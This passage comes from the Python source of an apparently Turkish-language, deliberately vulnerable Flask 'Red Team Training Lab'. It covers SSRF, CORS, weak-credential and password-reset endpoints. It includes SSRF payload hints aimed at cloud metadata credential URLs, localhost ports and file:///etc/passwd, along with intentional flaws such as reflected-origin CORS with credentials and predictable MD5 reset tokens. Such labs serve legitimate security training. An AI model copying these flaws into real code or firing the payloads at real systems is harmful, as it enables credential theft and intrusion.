        <p><strong>Difficulty:</strong> MEDIUM-HARD | <strong>Category:</strong> Server-Side</p>
        <hr>
        <form method="POST">
            <p>URL: <input type="text" name="url" value="{url}" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #dc3545; color: white; border: none;">İsteği Gönder</button>
        </form>
        {f'<h3>Yanıt:</h3><pre style="background: #f4f4f4; padding: 15px; max-height: 400px; overflow-y: auto;">{result[:5000]}</pre>' if result else ''}
        {f'<p style="color: red;">{error}</p>' if error else ''}
        <hr>
        <h3>İpuçları:</h3>
        <ul>
            <li>Cloud Metadata:</li>
            <ul>
                <li>AWS: <code>http://169.254.169.254/latest/meta-data/</code></li>
                <li>AWS: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
                <li>GCP: <code>http://metadata.google.internal/computeMetadata/v1/</code></li>
                <li>Azure: <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></li>
            </ul>
            <li>Internal Redis:</li>
            <ul>
                <li><code>redis://localhost:6379/</code></li>
            </ul>
            <li>Port tarama:</li>
            <ul>
                <li><code>http://127.0.0.1:22</code></li>
                <li><code>http://127.0.0.1:3306</code></li>
                <li><code>http://127.0.0.1:6379</code></li>
            </ul>
            <li>File protocol:</li>
            <ul>
                <li><code>file:///etc/passwd</code></li>
            </ul>
        </ul>
        <p><a href="/vulnerable">← Geri</a></p>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


@vulnerable_bp.route('/ssrf/api', methods=['GET'])
def ssrf_api():
    """
    SSRF API - JSON endpoint
    """
    target = request.args.get('target', '')
    if not target:
        return jsonify({
            'error': 'target parametresi gerekli',
            'usage': '/vulnerable/ssrf/api?target=<URL>',
            'examples': [
                'http://169.254.169.254/latest/meta-data/',
                'redis://127.0.0.1:6379/',
                'file:///etc/passwd'
            ]
        }), 400
    
    try:
        # GÜVENLİKSIZ: SSRF
        import urllib.request
        req = urllib.request.Request(target, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            content = response.read().decode('utf-8', errors='ignore')
            return jsonify({
                'target': target,
                'status_code': response.status,
                'content_length': len(content),
                'content': content[:2000]
            })
    except Exception as e:
        return jsonify({
            'target': target,
            'error': str(e),
            'note': 'Internal network access attempt detected'
        }), 400


# -----------------------------------------------------------------------------
# ZAFİYET 9: CORS MISCONFIGURATION
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/cors/api', methods=['GET', 'POST', 'OPTIONS'])
def cors_api():
    """
    CORS Misconfiguration Zafiyeti
    
    Difficulty: EASY
    Description: CORS header'ları güvensiz şekilde yapılandırılmış.
    Exploit: Credentials ile cross-origin istekleri mümkün.
    """
    origin = request.headers.get('Origin', '')
    
    # GÜVENLİKSIZ: Tüm origin'lere izin ver
    response = jsonify({
        'message': 'Gizli API verisi',
        'secret_data': 'CORS BYPASS SUCCESSFUL - Bu veri dış domain\'den erişilebilir!',
        'user_agent': request.headers.get('User-Agent'),
        'your_origin': origin
    })
    
    # GÜVENLİKSIZ: Tüm origin'lere credentials ile izin ver
    response.headers['Access-Control-Allow-Origin'] = origin if origin else '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    
    return response


@vulnerable_bp.route('/cors/sensitive', methods=['GET'])
def cors_sensitive():
    """
    CORS Sensitive Data Endpoint
    
    Difficulty: EASY
    Description: Gizli veriler CORS yanıtında mevcut.
    """
    # Credentials kontrolü yapılmıyor
    origin = request.headers.get('Origin', '')
    
    response = jsonify({
        'status': 'success',
        'sensitive_info': {
            'api_keys': ['sk-lab-12345', 'sk-prod-67890'],
            'database_password': 'postgres://admin:password123@localhost:5432/db',
            'jwt_secret': 'weak-jwt-secret-for-lab',
            'internal_ips': ['10.0.0.5', '10.0.0.6', '172.16.0.1']
        },
        'note': 'Bu veriler CORS sayesinde dışarıdan erişilebilir!'
    })
    
    # GÜVENLİKSIZ: Tüm origin'lere credentials ile izin ver
    response.headers['Access-Control-Allow-Origin'] = origin if origin else '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response


# -----------------------------------------------------------------------------
# ZAFİYET 10: WEAK CREDENTIALS & PASSWORD RESET
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/auth/login', methods=['POST'])
def auth_login():
    """
    Weak Credentials - Login
    
    Difficulty: EASY
    Description: Zayıf varsayılan şifreler ve bruteforce koruması yok.
    """
    username = request.json.get('username', '')
    password = request.json.get('password', '')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'success': True,
            'message': 'Giriş başarılı',
            'user': {
                'id': user['id'],
                'username': user['username'],
                'role': user['role']
            },
            'warning': 'Şifre plaintext olarak saklanıyor!'
        })
    else:
        return jsonify({
            'success': False,
            'error': 'Geçersiz kimlik bilgileri',
            'hint': 'admin/admin123, analyst/password, testuser/test123'
        }), 401


@vulnerable_bp.route('/auth/bruteforce', methods=['POST'])
def auth_bruteforce():
    """
    Brute Force Login
    
    Difficulty: EASY
    Description: Rate limiting yok, deneme sayısı sınırsız.
    """
    username = request.json.get('username', 'admin')
    password = request.json.get('password', '')
    
    # Basit kontrol (hiçbir güvenlik önlemi yok)
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    conn.close()
    
    if user and user['password'] == password:
        return jsonify({
            'success': True,
            'message': 'Şifre doğru!',
            'password_found': password
        })
    
    return jsonify({
        'success': False,
        'message': 'Şifre yanlış',
        'note': 'Rate limiting yok, denemeye devam edebilirsiniz!'
    })


@vulnerable_bp.route('/auth/password-reset', methods=['POST'])
def password_reset():
    """
    Weak Password Reset
    
    Difficulty: EASY
    Description: Şifre sıfırlama mekanizması güvensiz.
    """
    email = request.json.get('email', '')
    new_password = request.json.get('new_password', '')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # E-posta kontrolü (sadece @lab.local domain'ine izin veriliyor gibi görünüyor ama...)
    cursor.execute("SELECT * FROM users WHERE email LIKE ?", (f'%{email}%',))
    user = cursor.fetchone()
    
    if user:
        # GÜVENLİKSIZ: Şifre doğrudan güncelleniyor, eski şifre kontrolü yok
        cursor.execute("UPDATE users SET password = ? WHERE id = ?", (new_password, user['id']))
        conn.commit()
        
        response = {
            'success': True,
            'message': 'Şifre başarıyla güncellendi',
            'username': user['username'],
            'hint': 'Eski şifre kontrolü yok, herkes şifreni değiştirebilir!'
        }
    else:
        response = {
            'success': False,
            'error': 'Kullanıcı bulunamadı',
            'hint': 'Mevcut kullanıcılar: admin@lab.local, analyst@lab.local, test@lab.local'
        }
    
    conn.close()
    return jsonify(response)


@vulnerable_bp.route('/auth/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    """
    Forgot Password - Zafiyetli Implementasyon
    
    Difficulty: EASY
    Description: Şifre sıfırlama token'ı tahmin edilebilir veya sınırlı.
    """
    error = None
    success = None
    
    if request.method == 'POST':
        email = request.form.get('email', '')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
        user = cursor.fetchone()
        conn.close()
        
        if user:
            # GÜVENLİKSIZ: Token çok basit (timestamp + username hash)
            timestamp = int(time.time())
            token = hashlib.md5(f"{timestamp}{user['username']}secret".encode()).hexdigest()[:16]
            
            success = f"Şifre sıfırlama linki gönderildi!"
            success += f"<br><br>Token (demo amaçlı): <code>{token}</code>"
            success += f"<br>Timestamp: {timestamp}"
        else:
            error = "E-posta adresi bulunamadı"
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Password Reset</title></head>
    <body style="font-family: Arial; max-width: 500px; margin: 50px auto; padding: 20px;">
        <h2>🔐 Şifre Sıfırlama</h2>
        <form method="POST">
            <p>E-posta: <input type="email" name="email" style="width: 100%; padding: 10px;"></p>
            <button type="submit" style="padding: 10px 20px; background: #007bff; color: white; border: none;">Link Gönder</button>
        </form>
        {f'<p style="color: red;">{error}</p>' if error else ''}
        {f'<p style="color: green;">{success}</p>' if success else ''}
        <hr>
        <h4>Demo Kullanıcılar:</h4>
        <ul>
            <li>admin@lab.local</li>
            <li>analyst@lab.local</li>
            <li>test@lab.local</li>
        </ul>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# YÖNETİM PANELİ - TÜM ZAFİYETLERİN LİSTESİ
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/', methods=['GET'])
def vulnerable_dashboard():
    """
    Vulnerable Dashboard - Tüm zafiyetlerin listesi
    """
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Red Team Training Lab - Vulnerable Endpoints</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 1200px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #eee; }
            h1 { color: #e94560; text-align: center; }
            h2 { color: #0f3460; border-bottom: 2px solid #e94560; padding-bottom: 10px; }
            .vuln-card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 20px; margin: 15px 0; }
            .vuln-title { color: #e94560; font-size: 1.3em; margin-bottom: 10px; }
            .vuln-meta { color: #888; font-size: 0.9em; margin-bottom: 10px; }
            .vuln-desc { color: #aaa; margin-bottom: 15px; }
            .endpoint { background: #0f3460; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; }
            .difficulty { display: inline-block; padding: 3px 10px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }
            .easy { background: #28a745; color: white; }
            .medium { background: #ffc107; color: black; }
            .hard { background: #dc3545; color: white; }
            .category { color: #17a2b8; }
            a { color: #e94560; text-decoration: none; }
            a:hover { text-decoration: underline; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
            .header-info { background: #0f3460; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center; }
        </style>
    </head>
    <body>
        <h1>🎯 Red Team Training Lab</h1>
        <div class="header-info">
            <h2>Kasıtlı Olarak Güvensiz Uygulama</h2>
            <p>Bu uygulama, web güvenlik açıklarını öğrenmek ve pratik yapmak için tasarlanmıştır.</p>
            <p><strong>Dikkat:</strong> Tüm zafiyetler doğrudan aktiftir. Yalnızca izole ortamlarda kullanın.</p>
        </div>
        
        <div class="grid">
    '''
    
    vulnerabilities = [
        ('SQL Injection', 'Easy', 'Injection', 'Login bypass ve UNION-based veri sızdırma',
         ['/vulnerable/sql/login', '/vulnerable/sql/union']),
        ('Command Injection', 'Easy', 'Injection', 'Sistem komutu çalıştırma',
         ['/vulnerable/command/ping', '/vulnerable/command/nslookup']),
        ('SSTI', 'Medium-Hard', 'Code Injection', 'Server-side template injection',
         ['/vulnerable/ssti/render']),
        ('Insecure Deserialization', 'Medium', 'Code Injection', 'Pickle ve YAML unsafe loading',
         ['/vulnerable/deserialize/pickle', '/vulnerable/deserialize/yaml']),
        ('Weak JWT', 'Easy-Medium', 'Authentication', 'alg:none ve zayıf secret',
         ['/vulnerable/jwt/login', '/vulnerable/jwt/admin', '/vulnerable/jwt/verify']),
        ('IDOR', 'Easy', 'Broken Access Control', 'Yetkisiz kaynak erişimi',
         ['/vulnerable/idor/profile/1', '/vulnerable/idor/messages/1', '/vulnerable/idor/products/1']),
        ('File Upload', 'Easy-Medium', 'File Upload', 'Unrestricted webshell yükleme',
         ['/vulnerable/upload']),
        ('SSRF', 'Medium-Hard', 'Server-Side', 'Internal servislere erişim',
         ['/vulnerable/ssrf/fetch', '/vulnerable/ssrf/api']),
        ('CORS Misconfiguration', 'Easy', 'Configuration', 'Cross-origin data theft',
         ['/vulnerable/cors/api', '/vulnerable/cors/sensitive']),
        ('Weak Credentials', 'Easy', 'Authentication', 'Zayıf şifreler ve brute force',
         ['/vulnerable/auth/login', '/vulnerable/auth/bruteforce', '/vulnerable/auth/password-reset']),
    ]
    
    for vuln in vulnerabilities:
        title, difficulty, category, desc, endpoints = vuln
        html += f'''
        <div class="vuln-card">
            <div class="vuln-title">{title}</div>
            <div class="vuln-meta">
                <span class="difficulty {difficulty.lower()}">{difficulty}</span>
                <span class="category"> | {category}</span>
            </div>
            <div class="vuln-desc">{desc}</div>
            <div class="endpoints">
        '''
        for ep in endpoints:
            html += f'<div class="endpoint"><a href="{ep}">{ep}</a></div>'
        html += '</div></div>'
    
    html += '''
        </div>
        <hr style="margin-top: 30px;">
        <h2>📊 API Endpoints (JSON)</h2>
        <div class="vuln-card">
            <p>Aşağıdaki endpoint'ler JSON yanıtı döndürür ve otomatik tarama için uygundur:</p>
            <div class="endpoint">/vulnerable/idor/profile/1</div>
            <div class="endpoint">/vulnerable/idor/messages/1</div>
            <div class="endpoint">/vulnerable/jwt/admin</div>
            <div class="endpoint">/vulnerable/ssrf/api?target=http://example.com</div>
            <div class="endpoint">/vulnerable/cors/api</div>
            <div class="endpoint">/vulnerable/auth/login</div>
        </div>
    </body>
    </html>
    '''
    return Response(html, mimetype='text/html')


# -----------------------------------------------------------------------------
# SCANNER ENTEGRASYONU - OTOMATİK TEST İÇİN
# -----------------------------------------------------------------------------

@vulnerable_bp.route('/scanner/info', methods=['GET'])
def scanner_info():
    """
    Scanner için endpoint bilgisi
    Bu endpoint, ana scanner modülünün zafiyetli uç noktaları keşfetmesi için kullanılır.
    """
    return jsonify({
        'module': 'vulnerable',
        'name': 'Red Team Training Lab',
        'version': '1.0.0',
        'endpoints': [
            {
                'path': '/vulnerable/sql/login',
                'method': 'POST',
                'vulnerability': 'SQL Injection',
                'type': 'injection',
                'parameters': ['username', 'password']
            },
            {
                'path': '/vulnerable/sql/union',
                'method': 'GET',
                'vulnerability': 'SQL Injection (UNION)',
                'type': 'injection',
                'parameters': ['id']
            },
            {
                'path': '/vulnerable/command/ping',
                'method': 'POST',
                'vulnerability': 'Command Injection',
                'type': 'injection',
                'parameters': ['target']
            },
            {
                'path': '/vulnerable/ssti/render',
                'method': 'POST',
                'vulnerability': 'SSTI',
                'type': 'code_injection',
                'parameters': ['template']
            },
            {
                'path': '/vulnerable/deserialize/pickle',
                'method': 'POST',
                'vulnerability': 'Insecure Deserialization',
                'type': 'code_injection',
                'parameters': ['data']
            },
            {
                'path': '/vulnerable/jwt/login',
                'method': 'POST',
                'vulnerability': 'Weak JWT',
                'type': 'authentication',
                'parameters': ['username', 'password']
            },
            {
                'path': '/vulnerable/jwt/admin',
                'method': 'GET',
                'vulnerability': 'Weak JWT (Admin Bypass)',
                'type': 'authentication',
                'headers': ['Authorization']
            },
            {
                'path': '/vulnerable/idor/profile/<int:user_id>',
                'method': 'GET',
                'vulnerability': 'IDOR',
                'type': 'idor',
                'parameters': ['user_id']
            },
            {
                'path': '/vulnerable/upload',
                'method': 'POST',
                'vulnerability': 'Unrestricted File Upload',
                'type': 'file_upload',
                'parameters': ['file']
            },
            {
                'path': '/vulnerable/ssrf/fetch',
                'method': 'POST',
                'vulnerability': 'SSRF',
                'type': 'ssrf',
                'parameters': ['url']
            },
            {
                'path': '/vulnerable/cors/api',
                'method': 'GET',
                'vulnerability': 'CORS Misconfiguration',
                'type': 'cors',
                'headers': ['Origin']
            },
            {
                'path': '/vulnerable/auth/login',
                'method': 'POST',
                'vulnerability': 'Weak Credentials',
                'type': 'authentication',
                'parameters': ['username', 'password']
            },
            {
                'path': '/vulnerable/auth/bruteforce',
                'method': 'POST',
                'vulnerability': 'Brute Force',
                'type': 'authentication',
                'parameters': ['username', 'password']
            },
            {
                'path': '/vulnerable/auth/password-reset',
                'method': 'POST',
                'vulnerability': 'Weak Password Reset',
                'type': 'authentication',
                'parameters': ['email', 'new_password']
            }
        ]
    })


def register_vulnerable_routes(app):
    """
    Vulnerable blueprint'leri Flask uygulamasına kaydet.
    
    Kullanım:
        from cybermodules.vulnerable import register_vulnerable_routes
        from flask import Flask
        app = Flask(__name__)
        register_vulnerable_routes(app)
    """
    app.register_blueprint(vulnerable_bp)
    
    # Veritabanını başlat
    with app.app_context():
        init_training_db()
    
    return app


# Doğrudan çalıştırılabilir
if __name__ == '__main__':
    from flask import Flask
    import os
    
    app = Flask(__name__)
    app.secret_key = 'vulnerable-lab-secret-key'
    
    # Blueprint'leri kaydet
    register_vulnerable_routes(app)
    
    # Uploads klasörünü oluştur
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    
    print("=" * 60)
    print("🛑 Red Team Training Lab - Vulnerable Application")
    print("=" * 60)
    print("⚠️  TÜM ZAFİYETLER DOĞRUDAN AKTİF!")
    print("📍 Dashboard: http://localhost:5000/vulnerable")
    print("=" * 60)
    
    app.run(debug=True, host='0.0.0.0', port=5000)
